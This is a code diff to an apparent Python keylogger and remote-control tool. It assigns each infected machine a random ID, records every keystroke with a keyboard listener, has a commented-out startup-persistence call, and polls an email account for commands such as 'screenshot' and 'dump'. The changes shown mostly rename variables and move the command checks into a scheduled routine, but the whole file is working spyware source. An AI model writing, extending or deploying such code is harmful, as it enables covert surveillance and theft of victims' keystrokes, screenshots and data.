@@ -58,24 +58,26 @@ except FileExistsError:
     print("Folder already exists.")
 
 # ID assignment
-txt_file = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\ID"
+id_file = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\id"
 
-if not os.path.exists(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\ID"):
-    ID = str(random.randint(1, 10000))
+if not os.path.exists(os.path.dirname(os.path.abspath(sys.argv[0])) + "\\id"):
+    id = str(random.randint(1, 10000))
 
     # Open the file in write mode ('w')
-    with open(txt_file, 'w') as file:
-        file.write(str(ID))
+    with open(id_file, 'w') as file:
+        file.write(str(id))
 else:
-    with open(txt_file, 'r') as file:
+    with open(id_file, 'r') as file:
         content = file.read()
-    ID = content
-print(ID)
+    id = content
+print(id)
 
 # Keylog section
 inputs = []
 
 z = 1
+
+
 def on_press(key):
     global z
 
@@ -89,11 +91,13 @@ def on_press(key):
     except AttributeError:
         inputs.append(key)
 
+
 def on_release(key):
     ...
     if key == keyboard.Key.esc:
         # Stop listener
         return False
+
 
 listener = keyboard.Listener(
     on_press=on_press,
@@ -104,24 +108,23 @@ email = "email"
 password = "password"
 
 # add_to_startup()
-#usage: Command ID, eg: screenshot 7512
+# usage: Command ID, eg: screenshot 7512
 
 if __name__ == "__main__":
-    manager = EmailManager(email, password)
+    manager = EmailManager(email, password, id)
 
     setup = 0
     while setup == 0:
         if is_connected():
-            manager.new_email(manager.email, "ID", "screenshot", "[+] ID: " + str(ID) + "\n[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
+            manager.new_email(manager.email, "ID", "screenshot", "[+] ID: " + str(id) + "\n[*] Screenshot: " + "\n[*] Date: " + str(datetime.datetime.now()))
             setup = 1
         else:
             print("not connected")
             pass
     while True:
         if is_connected():
-            manager.quick_check(manager.email, "give", inputs, ID)
-            manager.quick_check(manager.email, "screenshot", inputs, ID)
-            manager.quick_check(manager.email, "dump", inputs, ID)
+            manager.keys = inputs
+            manager.scheduled_check()
         else:
             print("no internet")
             pass
